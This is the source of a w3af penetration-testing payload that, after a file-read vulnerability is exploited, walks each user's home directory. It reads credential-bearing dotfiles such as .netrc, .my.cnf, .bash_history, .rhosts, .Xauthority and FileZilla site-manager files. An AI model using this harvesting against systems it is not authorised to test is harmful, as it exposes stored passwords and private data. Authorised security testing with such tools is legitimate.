from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.ui.console.tables import table


class users_config_files(Payload):
    """
    This payload uses "users_folders" payload to find ".rc" and other configuration files,
    some of them may contain sensitive information.
    """

    def fname_generator(self):
        users_result = self.exec_payload('users')

        #=======================================================================
        # users_config_files.append('/etc/sudoers')
        # users_config_files.append('/etc/inittab')
        # users_config_files.append('/etc/crontab')
        # users_config_files.append('/etc/sysctl.conf')
        # users_config_files.append('/etc/mailname')
        # users_config_files.append('/etc/aliases')
        # users_config_files.append('/etc/pam.conf')
        # #TODO PUT IN APACHE
        # users_config_files.append('/etc/libapache2-mod-jk/workers.properties')
        #=======================================================================

        files = ['.bashrc', '.bashrc~', '.bash_history', '.bash_profile',
                 '.gtk-bookmarks', '.conkyrc', '.my.cnf', '.mysql_history',
                 '.ldaprc ', '.emacs', '.bash_logout', '.bash_login ',
                 '.hushlogin', '.mail.rc', '.profile', '.vimrc', '.gtkrc',
                 '.kderc', '.netrc', '.rhosts', '.Xauthority', '.cshrc',
                 '.login', '.joe_state',

                 # TODO: Should I move this to a separate payload?
                 '.filezilla/filezilla.xml', '.filezilla/recentservers.xml',
                 '.filezilla/sitemanager.xml',

                 ]

        for user in users_result:
            home = users_result[user]['home']

            for filename in files:
                yield home + filename

    def api_read(self):
        result = {}

        for file_, content in self.read_multi(self.fname_generator()):
            if content:
                result[file_] = content

        return result

    def run_read(self):
        api_result = self.api_read()

        if not api_result:
            return 'No user configuration files found.'
        else:
            rows = []
            rows.append(['User configuration files', ])
            rows.append([])
            for filename in api_result:
                rows.append([filename, ])

            result_table = table(rows)
            result_table.draw(80)
            return rows
